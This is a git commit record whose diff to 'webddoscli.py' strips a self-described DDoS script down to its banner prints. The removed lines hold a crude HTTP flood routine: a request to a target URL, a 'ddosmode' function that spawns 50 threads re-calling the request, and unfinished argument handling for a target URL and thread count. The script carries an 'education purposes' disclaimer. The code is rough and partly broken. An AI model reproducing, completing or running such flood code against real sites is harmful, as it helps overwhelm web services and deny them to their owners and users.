7a7b0efddb59cda85a71b7190153d2a97e50640c
Prattay Saekar <orginalprattayelec@gmail.com>
2023-07-08 15:07:30 +0530

    idk

--- webddoscli.py
+++ webddoscli.py
@@ -1,65 +1,16 @@
-import threading
-import sys
-import requests
-from colorama import Fore
-
-print(Fore.GREEN + "╔═════════╣ About ╠══════════╗")
-print(Fore.GREEN + "║+-     WebDDOScli V1.0    -+║")
-print(Fore.GREEN + "║+- Made Proudly in India, -+║")
-print(Fore.GREEN + "║+-    By Prattay Sarkar   -+║")
-print(Fore.GREEN + "╚════════════════════════════╝")
-print(Fore.RED + "╔═════════════╣ WARNING! ╠═════════════╗")
-print(Fore.RED + "║+-   This Application is Created,   -+║")
-print(Fore.RED + "║+-      FOR EDUCATION PURPOSES!     -+║")
-print(Fore.RED + "║+- Please, Don't MISUSE This Tool!  -+║")
-print(Fore.RED + "╚══════════════════════════════════════╝\n")
-print(Fore.BLUE + "|+- Trying To Connect To ")
+# -*- coding: utf-8 -*-
+from colorama import Fore, Style
 
 
-# TODO: Call main() and fix the above line
-# TODO: Show Agrv1 and Argv2 in String 16
-def main():
-    response = requests.get('https://www.example.com')
+print(Fore.GREEN + "╔═════════╣ About ╠══════════╗" + Style.RESET_ALL)
+print(Fore.GREEN + "║+-     WebDDOScli V1.0    -+║" + Style.RESET_ALL)
+print(Fore.GREEN + "║+- Made Proudly in India, -+║" + Style.RESET_ALL)
+print(Fore.GREEN + "║+-    By Prattay Sarkar   -+║" + Style.RESET_ALL)
+print(Fore.GREEN + "╚════════════════════════════╝" + Style.RESET_ALL)
+print(Fore.RED + "╔═════════════╣ WARNING! ╠═════════════╗" + Style.RESET_ALL)
+print(Fore.RED + "║+-   This Application is Created,   -+║" + Style.RESET_ALL)
+print(Fore.RED + "║+-      FOR EDUCATION PURPOSES!     -+║" + Style.RESET_ALL)
+print(Fore.RED + "║+- Please, Don't MISUSE This Tool!  -+║" + Style.RESET_ALL)
+print(Fore.RED + "╚══════════════════════════════════════╝\n" + Style.RESET_ALL)
+print(Fore.BLUE + "|+- Trying To Connect To URL...")
 
-    # Check if the request was successful (status code 200 indicates success)
-    if response.status_code == 200:
-        print(Fore.GREEN + "Successfully Connected To URL!")
-        print(Fore.BLUE + "Switching Over To DDOS Mode...")
-        ddosmode()
-    elif response.status_code == 404:
-        print(Fore.RED + "URL Doesn't Exist!")
-        exit(1)
-    else:
-        print(Fore.RED + 'Request failed with status code:', response.status_code)
-
-
-def ddosmode():
-    # Create 50 threads and start them
-    threads = []
-    for _ in range(50):
-        thread = threading.Thread(target=main)
-        thread.start()
-        threads.append(thread)
-
-    # Wait for all threads to finish
-    for thread in threads:
-        thread.join()
-
-    # Check if arguments are missing
-    if len(sys.argv) != 3:
-        print(Fore.RED + "Usage: python webddoscli.py <URL in Full (Including https://)> <No. Of Threads>")
-        sys.exit(1)
-
-    # Retrieve the arguments
-    arg1 = sys.argv[1]
-    arg2 = sys.argv[2]
-
-    # Check if any argument is empty
-    if not arg1 or not arg2:
-        print(Fore.RED + "Error: Both arguments are required.")
-        print(Fore.RED + "Usage: python webddoscli.py <URL in Full (Including https://)> <No. Of Threads>")
-        sys.exit(1)
-
-    # Use the arguments
-    print("Argument 1:", arg1)
-    print("Argument 2:", arg2)
